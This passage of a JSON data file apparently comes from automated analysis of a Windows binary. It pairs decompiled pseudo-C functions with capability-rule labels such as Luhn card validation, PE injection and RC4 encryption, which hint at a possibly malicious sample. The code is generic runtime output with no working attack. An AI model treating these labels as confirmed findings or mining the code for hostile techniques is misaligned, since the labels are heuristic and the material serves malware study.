        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041549c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack32 = &fcn.0041549c::pvarg;\n    puStack36 = 0x4154b1;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x415506;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.0041184c();\n    (**0x4aa984)();\n    if (pvarg != 0xd) {\n        fcn.00410c3c();\n    }\n    fcn.00406f54();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x41550d;\n    uStack40 = 0x415505;\n    fcn.00411420();\n    return;\n}\n",
        "token_count": 247
    },
    "00415b00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject pe/d5f0df8b10fc4abbbb9974951b6b6eb4"
        ],
        "decompiled_code": "\nvoid fcn.00415b00(void)\n\n{\n    char cVar1;\n    uint16_t in_AX;\n    int32_t *in_FS_OFFSET;\n    uint *puStack552;\n    int32_t iStack548;\n    uint uStack544;\n    uchar *puStack540;\n    uint var_208h;\n    uint var_204h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack540 = &stack0xfffffffc;\n    uStack544 = 0x415c26;\n    iStack548 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffddc;\n    if ((in_AX & 0xfff) < 0x15) {\n        puStack552 = 0x415b44;\n        puStack540 = &stack0xfffffffc;\n        fcn.004054c0();\n    }\n    else if (in_AX == 0x100) {\n        puStack552 = 0x415b5c;\n        puStack540 = &stack0xfffffffc;\n        fcn.004054c0();\n    }\n    else if (in_AX == 0x101) {\n        puStack552 = 0x415b74;\n        puStack540 = &stack0xfffffffc;\n        fcn.004054c0();\n    }\n    else {\n        cVar1 = fcn.00415f5c();\n        if (cVar1 == '\\0') {\n            fcn.00409d80();\n            puStack552 = 0x415be7;\n            fcn.00405784();\n        }\n        else {\n            puStack552 = &fcn.00415b00::var_104h;\n            fcn.00404520();\n            fcn.00403088();\n            fcn.004056d0();\n        }\n    }\n    if ((in_AX & 0x2000) != 0) {\n        fcn.00405784();\n    }\n    if ((in_AX & 0x4000) != 0) {\n        fcn.00405784();\n    }\n    *in_FS_OFFSET = puStack552;\n    uStack544 = 0x415c2d;\n    iStack548 = 0x415c25;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 495
    },
    "00415d68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415d68(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if ((arg_8h != *(in_EAX + 4)) && (cVar1 = fcn.00415f5c(),  cVar1 != '\\0')) {\n        (**(*var_8h + 0x1c))(arg_8h);\n        return;\n    }\n    fcn.00415edc();\n    return;\n}\n",
        "token_count": 127
    },
    "00415dbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuchar __cdecl fcn.00415dbc(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint32_t in_ECX;\n    uint var_1h;\n    \n    (**(*in_EAX + 0x38))(&var_1h);\n    return *(arg_8h * 3 + 0x4a1aa6 + (in_ECX >> 0x18));\n}\n",
        "token_count": 109
    },
    "00415e30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00415e30(void)\n\n{\n    uint uVar1;\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    int32_t var_5h;\n    \n    uStack16 = 0x415e3b;\n    *NULL = fcn.00404a0c();\n    uStack16 = 0x4aa994;\n    uStack20 = 0x415e4b;\n    var_5h._0_1_ = extraout_DL;\n    sub.kernel32.dll_EnterCriticalSection();\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(stack0xfffffff8 + 4) != 0) {\n        *(*0x4aa990 + -0x400 + *(stack0xfffffff8 + 4) * 4) = *0x4a1a64;\n    }\n    *in_FS_OFFSET = uVar1;\n    uStack20 = 0x415e9a;\n    uStack24 = 0x4aa994;\n    uStack28 = 0x415e92;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 288
    },
    "00416018": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416018(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack316;\n    uint uStack312;\n    uchar *puStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_110h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    uStack296 = 0x4160ee;\n    uStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed4;\n    uStack304 = 0x4aa994;\n    puStack308 = 0x41604b;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack312 = 0x4160d1;\n    uStack316 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec4;\n    puStack308 = &stack0xfffffffc;\n    iVar3 = fcn.004066a4();\n    if (-1 < iVar3) {\n        iVar3 = iVar3 + 1;\n        iVar4 = 0;\n        do {\n            iVar1 = *(*0x4aa990 + iVar4 * 4);\n            if ((iVar1 != 0) && (iVar1 != *0x4a1a64)) {\n                fcn.00404520();\n                fcn.004056d0();\n                cVar2 = fcn.00409980();\n                if (cVar2 != '\\0') {\n                    *param_2 = iVar1;\n                    break;\n                }\n            }\n            iVar4 = iVar4 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack316;\n    puStack308 = 0x4160d8;\n    uStack312 = 0x4aa994;\n    uStack316 = 0x4160d0;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 487
    },
    "00416558": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416558(uint8_t *param_1, int32_t **param_2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    uint8_t uVar4;\n    int32_t *in_EAX;\n    uint32_t uVar5;\n    uint8_t *puVar6;\n    \n    piVar3 = param_2[2];\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar6 = (piVar3 & 0xffffff) + in_EAX;\n        uVar2 = *(**param_2 + 2 + *(**param_2 + 1));\n        uVar4 = *param_1;\n        if (uVar2 <= *param_1) {\n            uVar4 = uVar2;\n        }\n        *puVar6 = uVar4;\n        puVar1 = param_1 + 1;\n        for (uVar5 = uVar4; puVar6 = puVar6 + 1,  uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar6 = *puVar1;\n            puVar1 = puVar1 + 1;\n        }\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(piVar3 + *in_EAX))();\n        return;\n    }\n    (*piVar3)();\n    return;\n}\n",
        "token_count": 330
    },
    "004165ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004165ac(void)\n\n{\n    fcn.00405708();\n    fcn.00416558();\n    return;\n}\n",
        "token_count": 31
    },
    "004165f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004165f4(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(param_2 + 0xb) == 0xff) {\n        fcn.004165e0();\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(*(param_2 + 8) + *in_EAX))();\n        return;\n    }\n    (**(param_2 + 8))();\n    return;\n}\n",
        "token_count": 118
    },
    "004166bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004166bc(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    code *var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x416783;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    cVar1 = ***param_2;\n    if ((cVar1 == '\\x05') || (cVar1 == '\\n')) {\n        fcn.004056f4();\n        fcn.0041668c();\n    }\n    else if (cVar1 == '\\v') {\n        var_8h = param_2[2];\n        if ((var_8h & 0xff000000) == 0xff000000) {\n            puStack32 = &stack0xfffffffc;\n            fcn.00405c84();\n        }\n        else {\n            if ((var_8h & 0xff000000) == 0xfe000000) {\n                var_8h = *(*in_EAX + var_8h);\n            }\n            if (param_2[4] == -0x80000000) {\n                puStack32 = &stack0xfffffffc;\n                (*var_8h)();\n            }\n            else {\n                puStack32 = &stack0xfffffffc;\n                (*var_8h)();\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41678a;\n    uStack36 = 0x416782;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 402
    },
    "004169a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004169a0(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (*(param_2 + 0xb) == 0xff) {\n        fcn.0041698c();\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(*(param_2 + 8) + *in_EAX))();\n        return;\n    }\n    (**(param_2 + 8))();\n    return;\n}\n",
        "token_count": 118
    },
    "004169e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004169e0(uint *param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    \n    pcVar1 = *(param_2 + 8);\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar3 = in_EAX + (pcVar1 & 0xffffff);\n        uVar2 = param_1[1];\n        *puVar3 = *param_1;\n        puVar3[1] = uVar2;\n        return;\n    }\n    if (0xfd < *(param_2 + 0xb)) {\n        (**(pcVar1 + *in_EAX))();\n        return;\n    }\n    (*pcVar1)(*param_1, param_1[1]);\n    return;\n}\n",
        "token_count": 196
    },
    "00416a18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416a18(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t *in_EAX;\n    uint *puVar2;\n    int32_t in_EDX;\n    \n    pcVar1 = *(in_EDX + 8);\n    if (*(in_EDX + 0xb) == 0xff) {\n        puVar2 = in_EAX + (pcVar1 & 0xffffff);\n        *puVar2 = arg_8h;\n        puVar2[1] = arg_ch;\n    }\n    else if (*(in_EDX + 0xb) < 0xfe) {\n        (*pcVar1)(arg_8h, arg_ch);\n    }\n    else {\n        (**(pcVar1 + *in_EAX))();\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00416a54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416a54(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    code *pcStack16;\n    \n    pcStack16 = *(param_2 + 8);\n    if ((pcStack16 & 0xff000000) == 0xff000000) {\n        fcn.00406f54();\n    }\n    else {\n        if ((pcStack16 & 0xff000000) == 0xfe000000) {\n            pcStack16 = *(*in_EAX + pcStack16);\n        }\n        if (*(param_2 + 0x10) == -0x80000000) {\n            (*pcStack16)();\n        }\n        else {\n            (*pcStack16)();\n        }\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "004182e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004182e0(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 0;\n    iVar4 = *(*(in_EAX + 0xc) + 8);\n    if (-1 < iVar4 + -1) {\n        do {\n            iVar2 = fcn.00419610();\n            cVar1 = fcn.0040486c();\n            if ((cVar1 != '\\0') && ((iVar3 == 0 || (cVar1 = fcn.0040486c(),  cVar1 != '\\0')))) {\n                iVar3 = iVar2;\n            }\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    return CONCAT44(param_2, iVar3);\n}\n",
        "token_count": 206
    },
    "004186f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004186f4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    uVar1 = fcn.00404610();\n    *(in_EAX + 4) = uVar1;\n    sub.kernel32.dll_InitializeCriticalSection();\n    iVar2 = fcn.004183b0();\n    fcn.004194b8();\n    *(iVar2 + 0x10) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 214
    },
    "00418850": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00418850(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_10ch;\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    var_10ch = 0;\n    uStack280 = 0x4188d3;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack284;\n    fcn.00404520();\n    var_8h = &var_108h;\n    var_4h._0_1_ = 4;\n    arg_ch = &var_8h;\n    arg_8h_00 = 0;\n    fcn.00407480();\n    fcn.0040da34(arg_8h_00, arg_ch);\n    fcn.00404eb4();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack284 = 0x4188da;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 280
    },
    "004189ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004189ac(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 38
    },
    "00418a64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00418a64(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 40
    },
    "00418cb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00418cb0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x418d10;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_8h;\n    arg_8h = 0;\n    fcn.00407480();\n    fcn.0040da34(arg_8h, arg_ch);\n    fcn.00404eb4();\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x418d17;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 228
    },
    "00418fa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418fa0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404964();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 8) = arg_ch;\n    *(in_EAX + 0xc) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack20;\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00419080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00419080(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_ECX;\n    uint *in_EDX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if (-1 < arg_8h) {\n        arg_8h = arg_8h + 1;\n        iVar2 = in_ECX + 4;\n        do {\n            cVar1 = fcn.00409980();\n            if (cVar1 != '\\0') {\n                *in_EDX = *(iVar2 + -4);\n                return 1;\n            }\n            iVar2 = iVar2 + 8;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 181
    },
    "004190c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.004190c0(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    if (-1 < arg_8h) {\n        arg_8h = arg_8h + 1;\n        do {\n            if (in_EAX == *in_ECX) {\n                fcn.004054c0();\n                return 1;\n            }\n            in_ECX = in_ECX + 2;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 148
    },
    "00419328": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419328(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    uStack280 = 0x4193be;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee4;\n    if ((in_EAX != *0x417ec0) && (in_EAX != *(arg_8h + -8))) {\n        fcn.004045cc();\n        fcn.00419328(arg_8h);\n        fcn.00404520();\n        fcn.004056d0();\n        fcn.004068f0(0);\n        fcn.00406940();\n        fcn.004191c0();\n    }\n    *in_FS_OFFSET = uStack284;\n    puStack276 = 0x4193c5;\n    uStack280 = 0x4193bd;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 259
    },
    "00419504": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419504(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if ((param_2 < 0) || (in_EAX[2] <= param_2)) {\n        fcn.0041959c();\n    }\n    iVar1 = *(in_EAX[1] + param_2 * 4);\n    in_EAX[2] = in_EAX[2] + -1;\n    if (param_2 < in_EAX[2]) {\n        fcn.004030ec();\n    }\n    if (iVar1 != 0) {\n        (**(*in_EAX + 4))();\n    }\n    return;\n}\n",
        "token_count": 163
    },
    "00419564": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419564(uint param_1, uint param_2)\n\n{\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar auStack16 [4];\n    uchar uStack12;\n    \n    fcn.00419560();\n    uStack12 = 0;\n    uStack52 = 0;\n    iStack48 = fcn.0040da34(0, auStack16);\n    if (iStack48 == 0) {\n        iStack48 = fcn.00405460();\n    }\n    uStack44 = param_2;\n    // WARNING: Could not recover jumptable at 0x00404ed5. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x4a6014)(0xeedfade, 1, 7, &uStack52);\n    return;\n}\n",
        "token_count": 196
    },
    "0041968c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041968c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if ((param_2 < 0) || (in_EAX[2] < param_2)) {\n        fcn.0041959c();\n    }\n    if (in_EAX[2] == in_EAX[3]) {\n        (***in_EAX)();\n    }\n    if (param_2 < in_EAX[2]) {\n        fcn.004030ec();\n    }\n    *(in_EAX[1] + param_2 * 4) = param_1;\n    in_EAX[2] = in_EAX[2] + 1;\n    if (param_1 != 0) {\n        (**(*in_EAX + 4))();\n    }\n    return;\n}\n",
        "token_count": 188
    },
    "00419774": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419774(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((param_2 < *(in_EAX + 8)) || (0x7ffffff < param_2)) {\n        fcn.0041959c();\n    }\n    if (param_2 != *(in_EAX + 0xc)) {\n        fcn.00402f24();\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "004197b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004197b0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((param_2 < 0) || (0x7ffffff < param_2)) {\n        fcn.0041959c();\n    }\n    if (*(in_EAX + 0xc) < param_2) {\n        fcn.00419774();\n    }\n    if (*(in_EAX + 8) < param_2) {\n        fcn.00403ae4();\n    }\n    else {\n        iVar1 = *(in_EAX + 8) + -1;\n        iVar2 = param_2 - iVar1;\n        if (iVar2 == 0 || param_2 < iVar1) {\n            iVar2 = iVar2 + -1;\n            do {\n                fcn.00419504();\n                iVar2 = iVar2 + 1;\n            } while (iVar2 != 0);\n        }\n    }\n    *(in_EAX + 8) = param_2;\n    return;\n}\n",
        "token_count": 244
    },
    "00419828": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00419828(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    sub.kernel32.dll_InitializeCriticalSection();\n    uVar1 = fcn.00404610();\n    *(in_EAX + 4) = uVar1;\n    *(in_EAX + 0x20) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 186
    },
    "0041987c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041987c(void)\n\n{\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    int32_t iStack20;\n    uchar *puStack16;\n    int32_t var_5h;\n    \n    puStack16 = 0x419887;\n    *NULL = fcn.00404a0c();\n    puStack16 = 0x419895;\n    var_5h._0_1_ = extraout_DL;\n    fcn.00419980();\n    iStack20 = 0x4198df;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00404640();\n    fcn.00404630();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x4198e6;\n    iStack20 = 0x4198d2;\n    fcn.004199e4();\n    iStack20 = stack0xfffffff8 + 8;\n    uStack24 = 0x4198de;\n    sub.kernel32.dll_DeleteCriticalSection();\n    return;\n}\n",
        "token_count": 269
    },
    "004199e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004199e4(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 40
    },
    "00419bcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00419bcc(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_114h;\n    uint var_110h;\n    uint *var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack296 = 0x419c82;\n    uStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack300;\n    if (param_2 == 0) {\n        fcn.00405504();\n    }\n    else {\n        puStack292 = &stack0xfffffffc;\n        fcn.00404520();\n        fcn.004056d0();\n    }\n    var_114h = var_4h;\n    var_110h._0_1_ = 0xb;\n    fcn.00404520();\n    var_10ch = &var_104h;\n    var_108h._0_1_ = 4;\n    uVar1 = 1;\n    fcn.0040daf0(1, &var_114h);\n    fcn.00404eb4();\n    *in_FS_OFFSET = uVar1;\n    uStack300 = 0x419c89;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 345
    },
    "00419f14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419f14(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x419fbb;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x419f3e;\n    fcn.0041a084();\n    uStack48 = 0x419f9e;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    iVar1 = (**(*param_2 + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*param_2 + 0xc))();\n            (**(*param_2 + 0x18))(0);\n            (**(*in_EAX + 0x3c))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x419fa5;\n    uStack48 = 0x419f9d;\n    fcn.0041a140();\n    return;\n}\n",
        "token_count": 361
    },
    "00419fcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
